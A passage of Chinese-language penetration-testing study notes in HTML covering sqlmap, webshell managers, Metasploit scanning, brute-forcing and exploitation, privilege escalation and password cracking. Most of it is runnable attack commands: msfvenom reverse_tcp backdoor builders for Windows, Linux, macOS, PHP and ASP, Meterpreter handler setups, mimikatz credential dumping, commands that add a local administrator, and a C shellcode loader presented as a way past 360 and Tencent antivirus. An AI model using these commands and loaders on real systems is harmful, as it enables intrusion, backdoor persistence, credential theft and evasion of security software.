+<p>当-level的参数设定为2或者2以上的时候，sqlmap会尝试注入cookie参数。</p>
+<p>\4.  自动执行默认选项</p>
+<p>参数：–batch</p>
+<p>\5.  使用代理服务器连接到目标URL</p>
+<p>参数：–proxy</p>
+<p>\6.  自动切换客户端请求</p>
+<p>参数：-random-agent</p>
+<p>\7.  设置测试线程数，默认线程1</p>
+<p>参数：–threads</p>
+<p>\8.  获取表中的数量</p>
+<p>参数：–count</p>
+<p>\9.  风险等级共有四个等级，默认为1，2会增加基于事件的测试语句，3会增加or语句的SQL注入测试。</p>
+<p>参数：–risk</p>
+<p>——测试等级</p>
+<p>​    探测等级（1-5）：参数：–level</p>
+<p>​    共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload.</p>
+<p>​    这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。</p>
+<p>​    总之，在你不确定那个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p>
+<p>​    风险等级：参数：–risk</p>
+<p>​    共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p>
+<p>​    在有些时候，例如在UPDATE的语句中，诸如一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p>
+<p>——命令操作</p>
+<p>\1.  数据库操作</p>
+<p>–sql-shell 产生一个交互式的sql shell，用来执行sql命令</p>
+<p>​    \2. 系统操作</p>
+<p>​       –os-shell 产生交互式的操作系统的shell，用来执行cmd命令。</p>
+<p>​       a). –os-shell系统操作的要求</p>
+<p>​           1). 网站必须是root权限</p>
+<p>​           2). 攻击者需要知道网站的绝对路径</p>
+<p>​           3). GPC为off，php主动转义的功能关闭</p>
+<p>​           4). secure_file_priv为空</p>
+<p>​       b). 使用—os-shell后会生成两个文件</p>
+<p>​           \1. 上传脚本文件；2. 后门文件。</p>
+<p>——脚本介绍</p>
+<p>\1.  脚本作用：帮助我们绕过一些waf，进行测试</p>
+<p>\2.  脚本目录：Tamper目录下</p>
+<h2 id="sqlmap之sql注入二"><a href="#sqlmap之sql注入二" class="headerlink" title="sqlmap之sql注入二"></a>sqlmap之sql注入二</h2><p>——sqlmap小技巧</p>
+<p>\1.  判断可注入的参数；</p>
+<p>\2.  判断可以用哪种SQL注入技术来注入；</p>
+<p>\3.  识别出哪种数据库；</p>
+<p>\4.  根据用户选择，读取哪些数据。</p>
+<p>—sqlmap支持五种不同的注入模式：</p>
+<p>\1.  基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</p>
+<p>\2.  基于时间的盲注，即不能根据页面返回的内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
+<p>\3.  基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
+<p>\4.  联合查询注入，可以使用union的情况下的注入。</p>
+<p>\5.  堆查询注入，可以同时执行多条语句的执行时的注入。</p>
+<p>—sqlmap注入监测</p>
+<p>​    如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。</p>
+<p>​    共有7个等级，默认为1.</p>
+<p>0、    只显示python错误以及严重的信息。</p>
+<p>1、    同时显示基本信息和警告信息。（默认）</p>
+<p>2、    同时显示debug信息。</p>
+<p>3、    同时显示注入的payload。</p>
+<p>4、    同时显示HTTP请求。</p>
+<p>5、    同时显示HTTP响应头。</p>
+<p>6、    同时显示HTTP响应页面。</p>
+<p>注：如果想看到sqlmap发送的测试payload最好的等级就是3.</p>
+<p>——Burp+sqlmap批量测试</p>
+<p>​    burpsuite导出log配合sqlmap批量扫描注入点。</p>
+<p>​    sqlmap可以批量扫描包含有request的日志文件，而request日志文件可以通过burpsuite来获取，因此通过sqlmap结合burpsuite工具，可以更加高效的对应用程序是否存在SQL注入漏洞进行地毯式的扫描。</p>
+<p>\1.  首先是burp设置记录log，文件名任意。</p>
+<p>\2.  把记录的log文件放在sqlmap目录下。</p>
+<p>\3.  sqlmap读取log自动测试：</p>
+<p>python sqlmap.py -l 文件名 –batch -smart</p>
+<p>batch：自动选yes；  smart：启发式快速判断，节约时间。</p>
+<p>\4.  最后能注入的URL会保存到out文件夹下。</p>
+<p>注意：log文件中如果有sqlmap无法读取的字符（ascII码之外的字符）会读取失败。</p>
+<p>​    —步骤</p>
+<p>\1.  配置burpsuite下记录所有的request记录，并保存在指定文件夹。</p>
+<p>\2.  执行命令：sqlmap.py -l burp.log –batch -smart 即可对burp.log中保存的所有request进行注入扫描。</p>
+<p>windows版的sqlmap最后能注入的URL都会保存在c:\users\administrator.sqlmap文件下。</p>
+<p>——sqlmap+burp</p>
+<p>\1.  代理监听sqlmap测试语句</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> –-proxy=<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
+<p>\2.  sqlmap快速测试burp数据包</p>
+<p>-r参数，从文件中读取数据包</p>
+<p>​    \3. 使用burp插件跑sqlmap注入。</p>
+<p>​       <a target="_blank" rel="noopener" href="https://github.com/portswigger/co2">https://github.com/portswigger/co2</a></p>
+<h2 id="Webshell管理工具"><a href="#Webshell管理工具" class="headerlink" title="Webshell管理工具"></a>Webshell管理工具</h2><p>——简介</p>
+<p>\1.  “web”的含义是显然需要服务器开放web服务</p>
+<p>“shell”的含义是取得对服务器某种程度上操作权限</p>
+<p>\2.  使用者</p>
+<p>站长：网站管理、服务器管理、管理数据库等</p>
+<p>入侵者：后门程序、控制服务器、达到目的等</p>
+<p>​    简称：后门，入侵者为了达到目的以及作为控制对方的后门文件。</p>
+<p>——大马小马一句话</p>
+<p>\1.  小马：文件体积较小、上传文件、文件修改、文件管理</p>
+<p>\2.  大马（不推荐）</p>
+<p>文件体积较大、功能齐全、能够提权、操作数据库等</p>
+<p>\3.  一句话木马（主流）</p>
+<p>短小精悍、功能强大、隐藏性好、客户端直接管理</p>
+<p>——中国菜刀</p>
+<p>​    它是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要 ，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英式编译，支持多国语言输入显示。</p>
+<p>\1.  安装：<a target="_blank" rel="noopener" href="http://www.maicaidao.co/">http://www.maicaidao.co/</a></p>
+<p>\2.  使用：图形化操作</p>
+<p>webshell管理工具是渗透人员常用的连接工具。</p>
+<p>——中国蚁剑</p>
+<p>​    它是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。是一款非常优秀的webshell管理工具。</p>
+<p>\1.  安装</p>
+<p>加载器：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a></p>
+<p>​      蚁剑源码：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
+<p>​       首先下载加载器，以及源码，使用加载器加载源码即可</p>
+<p>\2.  使用</p>
+<p>图形化操作：开源、跨平台、图形化、webshell管理工具</p>
+<p>——冰蝎Behinder</p>
+<p>​    作为新型加密网站管理客户端，冰蝎算是作为中国菜刀的替代者。</p>
+<p>\1.  安装：<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p>
+<p>运行环境：jre6~jre8：<a target="_blank" rel="noopener" href="https://www.java.com/">https://www.java.com</a></p>
+<p>\2.  使用：图形化操作</p>
+<h2 id="Linux-shell-Weevely"><a href="#Linux-shell-Weevely" class="headerlink" title="Linux shell Weevely"></a>Linux shell Weevely</h2><p>——简介</p>
+<p>​    它是一款使用python编译的webshell工具，集webshell生成和连接于一身，采用c/s模式构建，可以算作是linux下的一款php菜刀替代工具，具有很好的隐蔽性。</p>
+<p>​    在linux上使用时还是很好的，集服务器错误配置审计，后门放置，暴力破解，文件管理，资源搜索，网络代理，命令执行，数据库操作，系统信息收集及端口扫描等功能。</p>
+<p>​    地址：<a target="_blank" rel="noopener" href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p>
+<p>​    其他webshell管理工具（扩展）：中国菜刀、C刀、中国蚁剑、冰蝎、XISE</p>
+<p>——使用</p>
+<p>\1.  生成shell：weevely generate <password> &lt;文件名&gt;</p>
+<p>\2.  连接shell：weevely <URL> <password> [cmd]</p>
+<p>\3.  生成混淆shell：weevely generate -obfuscator cleartext1_php <password> &lt;文件名&gt;</p>
+<p>——模块</p>
+<p>\1.  信息收集</p>
+<p>:system_info 收集系统信息</p>
+<p>:system_info -info client_ip 查找自己连接ip</p>
+<p>\2.  文件管理</p>
+<p>:file_touch 修改文件时间</p>
+<p>:file_touch -human-ts ‘2018-09-15 20:41:20’ 文件名</p>
+<p>\3.  命令执行</p>
+<p>:shell_php 执行PHP命令</p>
+<p>:shell_php system(‘ipconfig’)；</p>
+<p>​    —生成meterpreter会话</p>
+<p>​       :backdoor_meterpreter -payload php/meterpreter/reverse_tcp -lhost 本机IP -port 端口</p>
+<p>​    —MSF设置</p>
+<p>​       use exploit multi/handler</p>
+<p>​       show payloads</p>
+<p>​       set payload php/meterpreter/reverse_tcp</p>
+<p>​       show options</p>
+<p>​       set lhost 本机IP</p>
+<p>​       run</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="Metasploit框架与基本命令"><a href="#Metasploit框架与基本命令" class="headerlink" title="Metasploit框架与基本命令"></a>Metasploit框架与基本命令</h2><p>——简介</p>
+<p>​    它是一个免费的、可下载的框架，通过它可以很容易的获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。</p>
+<p>——模块</p>
+<p>​    综合渗透测试框架</p>
+<p>​    Auxiliary 辅助模块 为渗透测试信息收集提供了大量的辅助模块支持</p>
+<p>​    Exploits 攻击模块 利用发现的安全漏洞或配置弱点对远程目标系统进行攻击，从而获得对远程目标系统访问权的代码组件</p>
+<p>​    Payload 攻击载荷模块 攻击成功后促使靶机运行的一段植入代码</p>
+<p>​    Post 后渗透攻击模块 收集更多信息或进一步访问被利用的目标系统</p>
+<p>​    Encoders 编码模块 将攻击载荷进行编码，来绕过防护软件拦截</p>
+<p>——MSF基础指令</p>
+<p>​    help/?     帮助菜单</p>
+<p>​    exit        退出MSF控制台</p>
+<p>​    Back       返回上一级</p>
+<p>​    info       显示一个或多个模块的信息</p>
+<p>​    show      显示所给类型的模块</p>
+<p>​    background 将当前操作在后台进行</p>
+<p>​    use        使用所选择的模块</p>
+<p>​    set        设置选项</p>
+<p>​    unset      取消设置的选项</p>
+<p>​    显示所有的exploit模块：show exploits</p>
+<p>​    显示模块信息：info windows/smb/ms17_010_eternalblue</p>
+<p>——MSF实践</p>
+<p>​    开启数据库：service postgresql start</p>
+<p>​    初始化msf数据库：msfdb init</p>
+<p>​    开启MSF：msfconsole</p>
+<p>​    查看数据连接状态：db_status</p>
+<p>——常用模块粗讲</p>
+<p>​    Auxiliary模块：show auxiliary</p>
+<p>​    命名规则：功能/服务/名称     scanner/smb/smb_ms17_010</p>
+<p>​    Exploits模块：show exploits</p>
+<p>​    rank表示好用级别：normal，excellent，good，average</p>
+<p>​    命名规则：操作系统/服务/名称    windows/smb/ms17_010_eternalblue</p>
+<p>​    Payload模块：命名规则：操作系统/类型/名称 windows/x64/meterpreter/reverse_tcp</p>
+<p>——msf搜索应用</p>
+<p>​    根据名称搜索：search ms17_010</p>
+<p>​    联合搜索：search name:ms17 type:auxiliary</p>
+<p>​    设置模块：use auxiliary/scanner/smb/smb_ms17_010</p>
+<p>​    查看选项：options</p>
+<p>——MSF主机管理</p>
+<p>​    命令：hosts    通过该命令可以添加主机以及删除主机等</p>
+<p>​    列出当前mac地址：hosts -c mac</p>
+<h2 id="MSF-扫描模块"><a href="#MSF-扫描模块" class="headerlink" title="MSF-扫描模块"></a>MSF-扫描模块</h2><p>——信息收集</p>
+<p>​    —获取whois信息：whois xxx.com</p>
+<p>通过whois等信息组合生成针对性的密码字典</p>
+<p>​    密码存在规律性，可破解性，对应性（撞库）</p>
+<p>​    在线密码生成：<a target="_blank" rel="noopener" href="https://www.bugku.com/mima/">https://www.bugku.com/mima/</a></p>
+<p>​    PoCBox辅助测试平台：<a target="_blank" rel="noopener" href="https://github.com/gh0stkey/PoCBox">https://github.com/gh0stkey/PoCBox</a></p>
+<p>​    密码字典生成工具：phpstudy卡伊码：<a target="_blank" rel="noopener" href="http://127.0.0.1/PoCBox-master/">http://127.0.0.1/PoCBox-master/</a></p>
+<p>​           测试账号：<a href="mailto:test123@163.com">test123@163.com</a></p>
+<p>​    密码泄露查询：<a target="_blank" rel="noopener" href="https://monitor.firefox.com/">https://monitor.firefox.com/</a></p>
+<p>​                  <a target="_blank" rel="noopener" href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a></p>
+<p>​    历史whois：<a target="_blank" rel="noopener" href="https://www.benmi.com/whoishistory/">https://www.benmi.com/whoishistory/</a></p>
+<p>​    注册网站：<a target="_blank" rel="noopener" href="https://www.reg007.com/">https://www.reg007.com/</a></p>
+<p>​    —DNS记录解析查询工具</p>
+<p>​       nslookup</p>
+<p>​       两种模式：</p>
+<p>\1.  非交互模式：nslookup -qt=类型 目标域名（默认查询类型时a地址记录IPV4）</p>
+<p>nslookup -qt=类型 目标域名 指定的DNS服务器IP或域名</p>
+<p>​       \2. 交互模式：nslookup    进入交互模式</p>
+<p>​           set qt=类型        指定查询类型，默认设置为a，IP或域名</p>
+<p>​           set at=另一个类型     切换查询类型</p>
+<p>​           help or ?          查看帮助</p>
+<p>​           exit           退出nslookup交互模式</p>
+<p>​       域名解析记录：</p>
+<p>​           <a target="_blank" rel="noopener" href="https://www.22.cn/help_34.html">https://www.22.cn/help_34.html</a></p>
+<p>​           <a target="_blank" rel="noopener" href="https://www.cnblogs.com/liyuanhong/articles/7355153.html">https://www.cnblogs.com/liyuanhong/articles/7355153.html</a></p>
+<p>​       在线nslookup：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/nslookup/">http://tool.chinaz.com/nslookup/</a></p>
+<p>​       DNS域传送漏洞：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/h4ck0ne/p/5154651.html">https://www.cnblogs.com/h4ck0ne/p/5154651.html</a></p>
+<p>——扫描模块</p>
+<p>​    —db_nmap 常用的端口扫描指令</p>
+<p>​        -sU：UDP扫描                  -sT：TCP扫描</p>
+<p>​        -sV：扫描系统版本和程序版本检测</p>
+<p>​        -n：禁止反向域名解析            -R：反向域名解析</p>
+<p>​        -6：启用IPV6扫描               –script=vuln 全面的漏洞扫描</p>
+<p>​        漏洞扫描，命令：</p>
+<p>​           db_nmap –script=vuln 192.168.1.2</p>
+<p>​           使用vuln脚本进行全面的漏洞扫描</p>
+<p>​        指纹识别扫描，命令：</p>
+<p>​           db_nmap -sV -v 192.168.1.2</p>
+<p>​        扫描系统和程序版本号检测，并且输出详细信息</p>
+<p>​    —自动化扫描插件wmap</p>
+<p>​       使用命令：</p>
+<p>​           msf&gt;load wmap    加载插件</p>
+<p>​           msf&gt;wmap_sites -a url  添加目标</p>
+<p>​           msf&gt;wmap_targets -t url   添加目标URL地址</p>
+<p>​           msf&gt;wmap_run -e     测试目标</p>
+<p>​           msf&gt;wmap_vulns      查看漏洞详细信息</p>
+<p>——漏洞库-searchsploit</p>
+<p>​    离线漏洞数据库搜索工具：searchsploit -t ftp</p>
+<p>​    离线漏洞数据库帮助我们在测试时找到对方的POC或者利用脚本</p>
+<p>​    手册：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/searchsploit">https://www.exploit-db.com/searchsploit</a></p>
+<h2 id="MSF密码爆破模块"><a href="#MSF密码爆破模块" class="headerlink" title="MSF密码爆破模块"></a>MSF密码爆破模块</h2><p>——常见的加密方式</p>
+<p>​    —MD5加密：常见的密码验证算法，用于操作系统的登陆认证</p>
+<p>​       明文密码：存在规律性，可破解性，对应性（撞库）</p>
+<p>​       密文：使用加密算法，唯一性，不可伪造性，不可逆性</p>
+<p>​       常见的hash加密：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0d53b9b5631e">https://www.jianshu.com/p/0d53b9b5631e</a></p>
+<p>​                         <a target="_blank" rel="noopener" href="https://cmd5.com/">https://cmd5.com/</a></p>
+<p>在线工具箱：<a target="_blank" rel="noopener" href="https://tool.bugku.com/">https://tool.bugku.com/</a></p>
+<p>​    —验证hash值</p>
+<p>​       windows自带工具验证hash值：</p>
+<p>certutil /? 查看帮助    certutil -hashfile 1.jpg MD5 查看文件MD5值</p>
+<p>作用：1. 验证文件是否损坏</p>
+<p>​            2.验证文件是否被修改（后门）</p>
+<p>案例：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/paper/147403.html">https://www.freebuf.com/articles/paper/147403.html</a></p>
+<p>​      <a target="_blank" rel="noopener" href="https://www.qianxin.com/other/CVE-2019-0708">https://www.qianxin.com/other/CVE-2019-0708</a></p>
+<p>——密码生成工具-genpAss</p>
+<p>​    中国特色的弱口令生成器</p>
+<p>​    指令： -n  名字   -u  用户名     -q  QQ号     -e  邮箱   -m 手机号</p>
+<p>​           -b  生日，格式：2000-01-01      -c  公司名     -o  导出文件</p>
+<p>​    地址：<a target="_blank" rel="noopener" href="https://github.com/RicterZ/genpAss">https://github.com/RicterZ/genpAss</a></p>
+<p>​    安全趣闻：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/197414.html">https://www.freebuf.com/sectool/197414.html</a></p>
+<p>​    密码泄露查询：<a target="_blank" rel="noopener" href="https://haveibeenpwned.com/Passwords">https://haveibeenpwned.com/Passwords</a></p>
+<p>——查找爆破模块</p>
+<p>​    查找关键词：login     msf&gt;search type:auxiliary login</p>
+<p>​    查找服务名：msf&gt;search type:auxiliary name:ssh</p>
+<p>​    查找服务名+关键词：msf&gt;search type:auxiliary name:phpMyAdmin login</p>
+<p>——实战密码爆破</p>
+<p>​    通过信息收集进行针对性的密码爆破</p>
+<p>\1.  SSH密码爆破：模块名：auxiliary/scanner/ssh/ssh_login</p>
+<p>\2.  mysql密码爆破：模块名：auxiliary/scanner/mysql/mysql_login</p>
+<p>\3.  phpmyadmin登陆验证爆破：模块名：auxiliary/scanner/http/phpMyAdmin_login</p>
+<h2 id="MSF-漏洞利用模块"><a href="#MSF-漏洞利用模块" class="headerlink" title="MSF-漏洞利用模块"></a>MSF-漏洞利用模块</h2><p>——快速搭建测试环境</p>
+<p>​    使用phpstudy快速进行环境配置</p>
+<p>​    它是一个PHP调试环境的程序集成包。</p>
+<p>​    集成：Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer，一次性安装，无须配置即可使用，是非常方便，好用的PHP调试环境，该程序不仅包括PHP调试环境，还包括了开发工具、开法手册等。</p>
+<p>​    下载地址：<a target="_blank" rel="noopener" href="http://www.phpstudy.net/">http://www.phpstudy.net</a></p>
+<p>​    配置问题：<a target="_blank" rel="noopener" href="http://www.xp.cn/wenda/388.html">http://www.xp.cn/wenda/388.html</a></p>
+<p>​    运行库：<a target="_blank" rel="noopener" href="http://www.php.cn/xiazai/gongju/1351">http://www.php.cn/xiazai/gongju/1351</a></p>
+<p>——phpmyadmin获取webshell</p>
+<p>​    phpmyadmin日志写shell</p>
+<p>​    前提：条件是root用户。思路：利用mysql的一个日志文件，这个日志文件每执行一个sql语句就会将其执行的保存。将这个日志文件重命名为shell.php，然后执行一条sql带一句话木马的命令。然后执行菜刀连接。</p>
+<p>设置导出文件：编辑general log，general log file</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin/index.php?token=c8c6084b26ebe891a039ca9f2d171876">http://localhost/phpMyAdmin/index.php?token=c8c6084b26ebe891a039ca9f2d171876</a></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ddd41b841c36">https://www.jianshu.com/p/ddd41b841c36</a></p>
+<p>——实战演示：phpmyadmin</p>
+<p>​    从漏洞扫描到漏洞利用</p>
+<p>​    扫描靶机：msf&gt;auxiliary/scanner/http/phpadmin_login</p>
+<p>​    选择exploit：use exploit/multi/http/phpMyAdmin_lfi_rce</p>
+<p>​    选择payload：set payload php/meterpreter/reverse_tcp</p>
+<p>​    攻击：run/exploit</p>
+<p>——反弹shell</p>
+<p>​    连接一般分为正向连接和反向连接：</p>
+<p>正向连接为：对方服务器开放端口，让我们去访问，例如使用：telnet 127.0.0.1:80</p>
+<p>反向连接为：我们开放端口，让对方访问，例如，反弹shell</p>
+<p>反弹shell：reverse shell，就是控制端监听在某tcp/udp端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</p>
+<p>​    为什么要反弹shell：1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了，他的ip会动态改变，不能持续控制。</p>
+<p>\2.  由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
+<p>\3.  对于病毒、木马，受害者什么时候能中招，对方的网络环境怎样，什么时候开机都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
+<p>攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
+<p>——通过反弹shell获得的会话的常用命令</p>
+<p>​    文件系统命令</p>
+<p>​    edit    编辑文件      getlwd     显示本地工作目录</p>
+<p>​    dir     列出目标文件目录     mkdir  创建目录</p>
+<p>​    网络、系统命令</p>
+<p>​    ifconfig    显示网络接口信息     netstat     显示网络连接信息</p>
+<p>​    execute    执行命令      ps     列出正在运行的进程</p>
+<p>​    sysinfo     获取远程系统的有关信息，例如OS</p>
+<p>​    用户界面命令</p>
+<p>​    getdesktop     获取当前用户桌面</p>
+<p>​    screenshot     获取目标截图</p>
+<p>​    授权、密码命令</p>
+<p>​    getsystem     尝试获取系统权限</p>
+<p>​    hashdump     获取目标NTDUMP</p>
+<h2 id="MSF拿到shell后提权"><a href="#MSF拿到shell后提权" class="headerlink" title="MSF拿到shell后提权"></a>MSF拿到shell后提权</h2><p>——信息收集-目的-权限提升</p>
+<p>​    目的：拿到管理员密码</p>
+<p>\1.  通过phpmyadmin漏洞拿到webshell</p>
+<p>\2.  权限提升：使用exp提权补丁进行权限提升，从用户权限到管理员权限：windows提权工具 <a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<p>使用MSF后渗透测试脚本提权。</p>
+<p>——信息收集-提权辅助工具</p>
+<p>​    快速查找exp提权补丁进行提权</p>
+<p>\1.  在线辅助网页：在线比对补丁查找exp: <a target="_blank" rel="noopener" href="https://bugs.hacking8.com/tiquan/">https://bugs.hacking8.com/tiquan/</a></p>
+<p>\2.  提权辅助工具：<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
+<p>——windows-exploit-suggester</p>
+<p>​    从漏洞扫描到漏洞利用</p>
+<p>​    suggester要求：python安装xlrd</p>
+<p>​    安装xlrd：pip install xlrd –upgrade</p>
+<p>​    先更新漏洞库：python windows-exploit-suggester.py –update</p>
+<p>​    扫描systeminfo信息：这个系统可以提权的补丁有哪些</p>
+<p>​    python windows-exploit-suggester.py -database 2019-12-06-mssb.xls –systeminfo sys.txt</p>
+<p>​    审计本地可利用漏洞信息</p>
+<p>​    python windows-exploit-suggester.py –audit -l –database 2019-12-06-mssb.xls –systeminfo sys.txt</p>
+<p>​    未使用补丁该系统可能存在的漏洞</p>
+<p>​    python windows-exploit-suggester.py -database 2019-12-06-mssb.xls –ostext ‘Windows 7’</p>
+<p>——提权补丁：MS15-051</p>
+<p>​    使用exp提取补丁创建用户</p>
+<p>​    net user a a.1 /add：添加用户并设置密码</p>
+<p>​    net localgroup administators a /add：将用户加入管理组</p>
+<p>——MSF提权</p>
+<p>​    使用MSF信息收集模块-查看提权脚本补丁</p>
+<p>​    本地提权信息收集模块</p>
+<p>​    use post/multi/recon/local_exploit_suggester</p>
+<p>​    创建一个基础木马：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.221.138 lport=1520 -f exe -o shell.exe</p>
+<p>——提权的姿势</p>
+<p>\1.  绕过UAC进行提权</p>
+<p>\2.  提供程序运行级别（runas）</p>
+<p>这种方法可以利用exploit/windows/local/ask模块，但是该模块实际上只是以高权限重启一个返回式shellcode，并没有绕过UAC，会触发系统UAC，受害机器有提示，提示用户是否要运行，如果用户选择yes，就可以返回一个高权限meterpreter shell（需要执行getsystem）</p>
+<p>\3.  利用windows提权漏洞进行提权</p>
+<p>Ms13_053,ms14_058,ms16_016,ms16_032,</p>
+<p>如exploit/windows/local/ms14_058_track_popup_menu</p>
+<p>——获取管理员密码</p>
+<p>​    —通过mimikatz获取管理员密码</p>
+<p>​        windows使用指令：需要管理员权限</p>
+<p>​        mimikatz.exe log</p>
+<p>​        mimikatz # privilege::debug</p>
+<p>​        mimikatz # sekurlsa::logonpasswords</p>
+<p>​       mimikatz # exit</p>
+<p>​       meterpreter&gt; mimikatz_command -f version //查看版本信息</p>
+<p>​       meterpreter&gt; mimikatz_command -f samdump::hashes //读取本地hash</p>
+<p>​       下载地址：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
+<p>——windows hash</p>
+<p>​    在线解密管理员密码</p>
+<p>​    windows系统下的hash密码格式为：</p>
+<p>​    用户名称：RID</p>
+<p>​    LM-HASH值：</p>
+<p>​    NT-HASH值：</p>
+<p>​    LM-NT都是hash算法</p>
+<p>​    在线解密：<a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
+<h2 id="MSF-后门生成模块"><a href="#MSF-后门生成模块" class="headerlink" title="MSF-后门生成模块"></a>MSF-后门生成模块</h2><p>——常见的木马生成</p>
+<p>​    使用MsFvenom快速生成木马并且进行连接</p>
+<p>​    生成一个常见木马文件：</p>
+<p>​    msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -I 5 lhost=192.168.88.134 lport=1250 -f exe&gt;shell.exe</p>
+<p>​    监听模块：use exploit/multi/handler</p>
+<p>​    设置payload：set payload windows/meterpreter/reverse_tcp</p>
+<p>​                set lhost 192.168.x.xx</p>
+<p>​                set lport 1250</p>
+<p>——常见后门生成方式</p>
+<p>\1.  windows</p>
+<p>msfvenom -platform windows -a x86 -p windows/meterpreter/reverse_tcp -I 3 -e x86/shikata_ga_nai -f exe -o c:\back.exe</p>
+<p>msfvenom -platform windows -a x86 -p windows/x64/meterpreter/reverse_tcp -f exe -o c:\back.exe</p>
+<p>\2.  Linux</p>
+<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f elf&gt;shell.elf</p>
+<p>\3.  MAC</p>
+<p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f macho&gt;shell.macho</p>
+<p>\4.  PHP</p>
+<p>msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f raw&gt;shell.php</p>
+<p>\5.  Asp</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f asp&gt;shell.asp</p>
+<p>\6.  Aspx</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f aspx&gt;shell.aspx</p>
+<p>——绕过360生成测试</p>
+<p>​    生成后门文件绕过360检测</p>
+<p>\1.  安装编译软件VC++6.0</p>
+<p>\2.  生成木马后门</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b ‘\x00’ lhost=192.168.153.138 lport=1250 -f c</p>
+<p>\3.  编译C语言为exe文件</p>
+<p>#include “stdafx.h”</p>
+<p>#include &lt;stdio.h&gt;</p>
+<p>#pragma comment(linker, “/subsystem:\”windows/” /entry:\”mainCRTStartup””)</p>
+<p>unsigned char buf[]=(这里放生成好的数组)</p>
+<p>main(){((void(*)(void))&amp;buf)();}</p>
+<p>\4.  测试是否成功</p>
+<p>——绕过腾讯管家生成测试</p>
+<p>\1.  编译c语言为exe文件</p>
+<p>#include “stdafx.h”</p>
+<p>#include &lt;stdio.h&gt;</p>
+<p>#pragma comment(linker, “/subsystem:\”windows/” /entry:\”mainCRTStartup\””)</p>
+<p>unsigned char buf[]=(这里放生成好的数组)</p>
+<p>main(){((void(*)(void))&amp;buf)();}</p>
+<p>\2.  测试是否成功</p>
+<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><h2 id="密码破解-Hashcat"><a href="#密码破解-Hashcat" class="headerlink" title="密码破解-Hashcat"></a>密码破解-Hashcat</h2><p>——简介</p>
+<p>​    hashcat号称世界上最快的密码破解，世界上第一个和唯一的基于GPUGPU规则引擎，免费多GPU（高达128个GPU），多哈希，多操作系统（linux和windows本地二进制文件），多平台（OpenCL和CUDA支持），多算法，资源利用率低，基于字典攻击，支持分布式破解等。目前支持各类公开算法高达247类，市面上公开的密码加密算法基本都支持。</p>
+<p>​    官网：<a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p>
+<p>​    Wiki：<a target="_blank" rel="noopener" href="https://hashcat.net/wiki/">https://hashcat.net/wiki/</a></p>
